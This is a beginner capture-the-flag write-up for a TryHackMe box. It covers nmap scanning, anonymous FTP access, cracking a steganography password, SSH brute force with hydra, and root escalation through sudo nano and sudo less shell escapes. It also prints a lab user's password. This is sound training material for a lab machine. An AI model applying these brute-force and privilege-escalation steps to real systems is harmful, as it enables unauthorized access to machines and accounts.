# TryHackMe-BrooklynCTF
Abdullah Rizwan, 25 August , 09:15 PM

BrooklynCTF is a beginner level anyone can try to hack this box. There are two main intended ways to root the box.

## NMAP
```
nmap -sC -sV 10.10.182.198
```

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-25 21:16 EDT
Stats: 0:00:15 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 21:16 (0:00:00 remaining)
Nmap scan report for 10.10.182.198
Host is up (0.16s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17 23:17 note_to_jake.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.94.60
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.96 seconds

```
There are 3 ports open on this box.Lets first visit the webpage.

## PORT 80

<a href="https://imgur.com/gXJz19O"><img src="https://i.imgur.com/gXJz19O.png" title="source: imgur.com" /></a>

<a href="https://imgur.com/HmjZ1iK"><img src="https://i.imgur.com/HmjZ1iK.png" title="source: imgur.com" /></a>

When we look at the source of this page it says something about steganography so that image has something hidden with it.

## PORT 21

<a href="https://imgur.com/sNTPWsN"><img src="https://i.imgur.com/sNTPWsN.png" title="source: imgur.com" /></a>

Since ftp is open we can connect to using the username "anonymous" with no password to be provided and we can download a file named "note_to_jake".

<a href="https://imgur.com/wwNH0TH"><img src="https://i.imgur.com/wwNH0TH.png" title="source: imgur.com" /></a>

So we know that there is a user named "jake".

## Steganography

We saw a hidden message towards steganography so now lets try to extract data from image.

<a href="https://imgur.com/qspdhaP"><img src="https://i.imgur.com/qspdhaP.png" title="source: imgur.com" /></a>

If we try to extract data from image it's going to ask for a password so we have to crack it using "stegcracker" which can be installed from here
https://github.com/Paradoxis/StegCracker.

<a href="https://imgur.com/ShNAWPL"><img src="https://i.imgur.com/ShNAWPL.png" title="source: imgur.com" /></a>

<a href="https://imgur.com/ShNAWPL"><img src="https://i.imgur.com/ShNAWPL.png" title="source: imgur.com" /></a>

## PORT 22

As we have found that there are two users "jake" and "holt" in order to find out jake's password we can bruteforce ssh using hydra

```
hydra -l jake -P /usr/share/wordlists/rockyou.txt -t 16 10.10.182.198 ssh

```

<a href="https://imgur.com/p3YTZ48"><img src="https://i.imgur.com/p3YTZ48.png" title="source: imgur.com" /></a>

For simplicity lets make a variable for the box's IP

```
export IP=10.10.182.198
```
<a href="https://imgur.com/NNPCW29"><img src="https://i.imgur.com/NNPCW29.png" title="source: imgur.com" /></a>

<a href="https://imgur.com/OSQMIBE"><img src="https://i.imgur.com/OSQMIBE.png" title="source: imgur.com" /></a>

We can now use "less" command in order to view files.


## Privilege Escalation (Holt)

In order to completely own the box through Holt we have sudo rights for "nano".

The password that we got from extracting information from the image can be utilized here


Login as "holt" from ssh using  password "fluffydog12@ninenine".

<a href="https://imgur.com/NNPCW29"><img src="https://i.imgur.com/NNPCW29.png" title="source: imgur.com" /></a>

```
holt@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
holt@brookly_nine_nine:~$

```
Visit GTFOBIN for escalating privileges

```
sudo nano
```
```
^R^X
```
```
reset; sh 1>&0 2>&0
```
<a href="https://imgur.com/tHylRoZ"><img src="https://i.imgur.com/tHylRoZ.png" title="source: imgur.com" /></a>

As soon as you'll hit enter you will be "root".

<a href="https://imgur.com/0K4C4zl"><img src="https://i.imgur.com/0K4C4zl.png" title="source: imgur.com" /></a>


## Privilege Escalation (Jake)

Login as jake through ssh after you got his credentials through bruteforce or you can switch between usesr.

```
su - jake
password:
```

<a href="https://imgur.com/OSQMIBE"><img src="https://i.imgur.com/OSQMIBE.png" title="source: imgur.com" /></a>

```
sudo less /etc/profile
```
```
!/bin/sh
```
<a href="https://imgur.com/1Fkjhyn"><img src="https://i.imgur.com/1Fkjhyn.png" title="source: imgur.com" /></a>
